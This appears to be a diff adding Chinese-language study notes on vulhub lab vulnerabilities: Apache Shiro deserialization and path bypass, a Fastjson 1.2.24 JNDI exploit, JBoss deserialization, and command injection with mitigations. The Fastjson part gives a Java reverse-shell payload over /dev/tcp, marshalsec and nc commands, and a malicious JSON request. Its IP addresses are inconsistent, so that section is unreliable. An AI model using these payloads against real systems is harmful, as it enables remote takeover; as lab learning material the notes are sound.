@@ -1,0 +1,106 @@
+apache shiro 1.2.4反序列化漏洞——
+cve-2016-4437
+下载vulhub并使用docker打开靶机
+shiro是一款开源的java安全框架,能够方便地开启各类密码认证功能,分辨shiro的方法是请求头的set-cookie会有,rememberMe
+cookieremembermemanager的加密流程为cookie值base64解码、aes解密、反序列化
+密钥硬编码导致aes使用的key泄露,使反序列化的cookie可控,从而可以引起反序列化攻击
+
+apache shiro 认证绕过漏洞——
+cve-2020-1957
+下载vulhub并使用docker打开靶机
+在1.5.2以前的版本中使用spring动态控制器时,构造..;这样的跳转可以绕过shiro中对目录的权限限制
+因此构造/xxx/..;/admin/这样的url可以进入到admin目录
+
+fastjson 1.2.24反序列化漏洞——
+cve-2017-18349
+下载vulhub并使用docker打开靶机
+Fastjson是阿里巴巴开发的一款JSON解析器。在解析JSON的过程中
+它支持使用autoType来实例化某一个具体的类,并调用该类的set/get方法来访问属性。
+通过查找代码中相关的方法,攻击者可以构造出恶意利用链。
+使用com.sun.rowset.JdbcRowSetImpl的利用链,通过JNDI注入来执行命令。
+首先编译命令执行代码
+import java.lang.ProcessBuilder;
+public class TouchFile {
+    public static void main(String[] args) {
+        try {
+            String ip = "192.168.88.128";
+            String port = "4444";
+            ProcessBuilder pb = new ProcessBuilder(
+                "/bin/bash", "-c", "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
+            );
+            pb.start();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+~  
+然后使用marshalsec项目启动一个RMI服务器,监听4444端口,并指定加载远程类TouchFile.class
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.88.134/#TouchFile" 9999
+开启监听
+nc -lvp 4444
+使用burp_suite向目标服务器发送包含RMI地址的Payload：
+POST / HTTP/1.1
+Host: 192.168.88.128:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json
+Content-Length: 160
+
+{
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://192.168.88.128:9999/TouchFile",
+        "autoCommit":true
+    }
+}
+
+jboss反序列化漏洞——
+cve-2017-12149
+下载vulhub并使用docker打开靶机
+Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。
+JBoss AS 5.x/6.x中,HttpInvoker组件中的ReadOnlyAccessFilter过滤器在未进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化,从而导致了漏洞。
+该漏洞出现在/invoker/readonly的请求中,服务器将用户提交的POST内容进行了java反序列化
+因此使用工具构造反弹shell编码,用ysoserial生成反序列化数据并将这个文件作为post body发送到/invoker/readonly中
+
+远程命令/代码执行漏洞——
+一、远程命令执行原理
+很多应用系统从设计上需要给用户提供指定的远程命令操作的接口
+比如很多网络设备的web管理界面上一般会有一个ping操作的web界面,用户从web界面输入目标IP
+提交后,后台会对该IP地址进行一次ping测试,并返回测试结果。而如果设计者在完成该功能时
+没有做严格的安全控制,则可能会导致攻击者通过该接口提交“意想不到”的命令,从而让后台进行执行,控制整个后台服务器。
+现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过"自动化运维平台"进行操作。在这种平台上往往会出现远程系统命令执行的漏洞
+二、远程代码执行原理
+同样的道理,因为需求设计,后台有时也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。
+因此,如果需要给前端用户提供操作类的API接口,一定需要对接口输入的内容进行严格的判断,比如实施严格的白名单策略会是一个比较好的方法。
+三、命令执行一般出现那些地方？
+只要带参数的地方都可能出现
+常见的路由器、防火墙、入侵检测、动化运维平台
+四、系统命令拼接方式
+|         管道符,前面命令标准输出,后面命令的标准输入。例如：help |more
+&       commandA & commandB 先运行命令A,然后运行命令B 
+||       commandA || commandB 运行命令A,如果失败则运行命令B
+&&    commandA && commandB 运行命令A,如果成功则运行命令B
+ping命令案例
+# 正常情况下,web输入框要求输入ip地址,回车即可开始ping
+192.168.1.1
+# 给ip后拼上其他命令
+192.168.1.1 & whoami
+# 整体命令变为
+ping 192.168.1.1 & whoami
+五、需要注意的函数
+#关于执行系统命令漏洞需要注意的函数
+assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
+#关于执行系统命令漏洞需要注意的函数
+eval,assert,call_user_func,base64_decode,gzinflate,gzuncompress,gzdecode,str_rot13
+六、解决方案
+假定所有输入都是可疑的
+尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入
+系统命令执行函数的参数不允许外部传递
+不仅要验证数据的类型,还要验证其格式、长度、范围和内容
+不要仅仅在客户端做数据的验证与过滤,关键的过滤步骤在服务端进行
+对输出的数据也要检查,数据库里的值有可能会在一个大网站的多处都有输出
+即使在输入做了编码等操作,在各处的输出点时也要进行安全检查
